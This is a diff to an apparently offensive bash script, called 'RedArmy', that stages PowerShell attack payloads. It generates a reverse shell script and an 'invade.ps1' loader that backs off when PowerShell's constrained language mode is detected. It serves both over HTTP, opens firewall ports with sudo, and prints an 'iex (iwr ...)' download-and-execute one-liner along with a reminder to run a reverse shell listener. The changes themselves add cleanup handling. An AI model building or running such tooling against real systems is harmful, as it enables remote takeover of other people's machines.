@@ -23,6 +23,16 @@ subinfo() { echo -e "${color:+\e[36m}[=] $*\e[0m"; }
 warn() { echo -e "${color:+\e[33m}[-] $*\e[0m"; }
 ### Helpers end
 
+cleanup() {
+    # Close firewall
+    subinfo "Closing $rport and $port on $ip interface (using sudo)"
+    sudo iptables -D INPUT -p tcp -d "$ip" --dport "$port" -j ACCEPT
+    sudo iptables -D INPUT -p tcp -d "$ip" --dport "$rport" -j ACCEPT
+
+    # Cleanup
+    rm -rf "$invade_ps1" "$rshell_ps1"
+}
+
 deploy() {
     local action
     local name="$1"
@@ -151,8 +161,10 @@ unset help update
 color="true"
 deps+=("git")
 deps+=("iptables")
+invade_ps1="invade.ps1"
 port="8080"
 rport="4444"
+rshell_ps1="rshell.ps1"
 
 # Check for missing dependencies
 check_deps
@@ -194,11 +206,15 @@ languagemode="\$ExecutionContext.SessionState.LanguageMode"
 red="\$([char]27)[41m"
 reset="\$([char]27)[0m"
 
-# Create reverse shell powershell script
-./reverse_powershell -p "$rport" "$ip" >rshell.ps1
+# Setup trap
+trap cleanup SIGINT
 
-# Setup invade.ps1
-cat >invade.ps1 <<EOF
+# Create reverse shell powershell script
+chmod +x scripts/reverse_powershell # Ensure executable
+./scripts/reverse_powershell -p "$rport" "$ip" >"$rshell_ps1"
+
+# Setup invade script
+cat >"$invade_ps1" <<EOF
 if (($languagemode -match "constrained")) {
     echo "Constrained shell detected, retreating"
     return
@@ -210,7 +226,7 @@ $(
     done < <(grep -Psv "^\s*(#.*)?$" "$config"); unset name path
 
     # Add reverse shell function
-    deploy ReverseShell ./rshell.ps1
+    deploy ReverseShell "./$rshell_ps1"
 )
 
 # Change prompt colors so user knows RedArmy is loaded in current
@@ -221,19 +237,13 @@ function prompt {
 EOF
 
 # Let user know what to type
-info "iex (iwr -DisableKeepAlive -UseBasicParsing $url/invade.ps1)"
+info "iex (iwr -DisableKeepAlive -UseBasicParsing $url/$invade_ps1)"
 warn "Don't forget your reverse shell listener on port $rport"
 
 # Open firewall
+subinfo "Opening $rport and $port on $ip interface (using sudo)"
 sudo iptables -I INPUT -p tcp -d "$ip" --dport "$port" -j ACCEPT
 sudo iptables -I INPUT -p tcp -d "$ip" --dport "$rport" -j ACCEPT
 
 # Serve via HTTP
-simplehttp "$port"
-
-# Close firewall
-sudo iptables -D INPUT -p tcp -d "$ip" --dport "$port" -j ACCEPT
-sudo iptables -D INPUT -p tcp -d "$ip" --dport "$rport" -j ACCEPT
-
-# Cleanup
-rm -rf invade.ps1 rshell.ps1
+simplehttp "$port" || cleanup
